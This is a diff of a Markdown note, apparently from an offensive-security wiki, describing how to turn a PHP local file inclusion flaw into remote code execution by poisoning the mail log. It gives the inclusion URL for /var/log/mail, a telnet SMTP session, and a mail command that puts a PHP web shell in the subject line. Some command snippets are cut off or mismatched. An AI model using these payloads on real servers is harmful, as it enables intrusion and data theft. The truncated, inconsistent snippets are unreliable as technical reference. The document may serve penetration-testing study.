@@ -36,6 +36,8 @@ This procedure involves exploiting a Local File Inclusion vulnerability to achie
 
 This procedure involves exploiting a Local File Inclusion vulnerability to achieve Remote Code Execution via a controlled log file. The attacker first sends an email using an open SMTP server, then includes the log file located at /var/log/mail via the vulnerable PHP script. The log file contains the attacker's PHP code which is executed on the server, resulting in Remote Code Execution. This technique can be used to gain unauthorized access to the target system and potentially steal sensitive data.
 
+ 
+
 ## Requirements
 
 1. Access to an open SMTP server
@@ -43,6 +45,8 @@ This procedure involves exploiting a Local File Inclusion vulnerability to achie
 1. Knowledge of the target system's file structure
 
 1. Vulnerable PHP script
+
+ 
 
 ## Defense
 
@@ -52,6 +56,8 @@ This procedure involves exploiting a Local File Inclusion vulnerability to achie
 
 1. Monitor for suspicious activity such as unexpected emails or file inclusions
 
+ 
+
 ## Objectives
 
 1. Achieve Remote Code Execution on the target system
@@ -60,13 +66,23 @@ This procedure involves exploiting a Local File Inclusion vulnerability to achie
 
 1. Potentially steal sensitive data
 
+ 
+
 # Instructions
 
 1. Send an email using the open SMTP server, then include the log file in the vulnerable PHP script
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=/var/log/mail]]
 
+
+
 > The attacker sends an email using an open SMTP server, then includes the log file located at /var/log/mail via the vulnerable PHP script. The log file contains the attacker's PHP code which is executed on the server, resulting in Remote Code Execution.
+
+
 
 **Command** ([[Accessing Mail Log File]]):
 
@@ -74,12 +90,22 @@ This procedure involves exploiting a Local File Inclusion vulnerability to achie
 http://example.com/index.php?page=/var/log/mail
 ```
 
+
+
 2. Use Telnet to connect to the target system's SMTP server, then send an email with PHP code
+
+ 
+
+
 
 **Code**: [[root@kali:~# telnet 10.10.10.10. 25
 Trying 10.10.1]]
 
+
+
 > The attacker connects to the target system's SMTP server using Telnet, then sends an email with PHP code in the subject line. The PHP code is executed on the server, resulting in Remote Code Execution.
+
+
 
 **Command** ([[Telnet SMTP server and send email with PHP code injection]]):
 
@@ -94,11 +120,21 @@ data2
 .
 ```
 
+
+
 3. Send an email with PHP code using the mail command
+
+ 
+
+
 
 **Code**: [[mail]]
 
+
+
 > The attacker sends an email with PHP code using the mail command. The PHP code is executed on the server, resulting in Remote Code Execution.
+
+
 
 **Command** ([[Send Test Email]]):
 
@@ -107,9 +143,17 @@ mail -s 'Test email' user@example.com
 This is a test email.
 ```
 
+
+
 4. Send an email with PHP code to the target system via the mail command
 
+ 
+
+
+
 **Code**: [[mail -s "<?php system($_GET['cmd']);?>" www-data@1]]
+
+
 
 > The attacker sends an email with PHP code to the target system using the mail command. The PHP code is executed on the server, resulting in Remote Code Execution.
 
@@ -138,3 +182,5 @@ This is a test email.
 - [[File Inclusion]]
 - [[LFI to RCE via controlled log file]]
 - [[RCE via Mail]]
+
+
